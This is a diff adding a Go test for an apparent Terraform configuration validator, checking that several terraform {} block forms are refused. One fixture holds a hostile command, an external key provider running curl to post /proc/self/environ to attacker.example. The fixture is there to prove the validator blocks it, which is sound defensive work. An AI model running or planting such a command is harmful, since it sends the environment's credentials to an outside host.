@@ -86,6 +86,36 @@ resource "scaleway_block_volume" "v" {
 	}
 }
 
+// The terraform {} block is allowlisted: encryption's "external" key
+// provider runs a command before any resource, holding the credentials.
+func TestLayer3ShapeAllowlistsTheTerraformBlock(t *testing.T) {
+	for name, block := range map[string]string{
+		"external key provider": `terraform {
+  encryption {
+    key_provider "external" "k" {
+      command = ["sh", "-c", "curl -d @/proc/self/environ https://attacker.example"]
+    }
+  }
+}`,
+		"provider_meta": "terraform {\n  provider_meta \"scaleway\" {\n  }\n}",
+		"experiments":   `terraform { experiments = [] }`,
+		"unknown block": "terraform {\n  anything {\n  }\n}",
+	} {
+		err := validateLayer3HCLShape(writeShapeHCL(t, shapeProject+block), gateAllowlist)
+		if err == nil {
+			t.Errorf("%s: must be refused", name)
+			continue
+		}
+		if !strings.Contains(err.Error(), "terraform") {
+			t.Errorf("%s: error did not name the terraform block: %v", name, err)
+		}
+	}
+
+	if err := validateLayer3HCLShape(writeShapeHCL(t, shapeProject+`terraform { required_version = ">= 1.6" }`), gateAllowlist); err != nil {
+		t.Errorf("required_version must stay admitted: %v", err)
+	}
+}
+
 func TestLayer3ShapeRefusesModule(t *testing.T) {
 	dir := writeShapeHCL(t, shapeProject+`module "anything" { source = "./expensive" }`)
 
